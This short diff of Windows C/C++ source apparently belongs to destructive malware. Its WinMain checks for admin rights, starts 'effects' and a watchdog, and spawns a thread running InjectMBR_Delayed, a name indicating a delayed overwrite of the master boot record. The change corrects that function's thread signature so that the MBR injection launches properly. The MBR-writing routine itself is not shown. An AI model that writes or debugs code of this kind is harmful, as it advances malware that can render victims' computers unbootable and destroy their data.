@@ -11,7 +11,7 @@ volatile bool g_running = true;
 
 extern void StartEffects();
 extern void StartWatchdog();
-extern void InjectMBR_Delayed();
+extern DWORD WINAPI InjectMBR_Delayed(LPVOID);
 
 BOOL IsAdmin() {
     HANDLE hToken;
@@ -64,9 +64,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     StartEffects();
     StartWatchdog();
     
-    HANDLE hThread = CreateThread(NULL, 0, 
-        (LPTHREAD_START_ROUTINE)InjectMBR_Delayed, 
-        NULL, 0, NULL);
+    HANDLE hThread = CreateThread(NULL, 0, InjectMBR_Delayed, NULL, 0, NULL);
     CloseHandle(hThread);
     
     MSG msg;
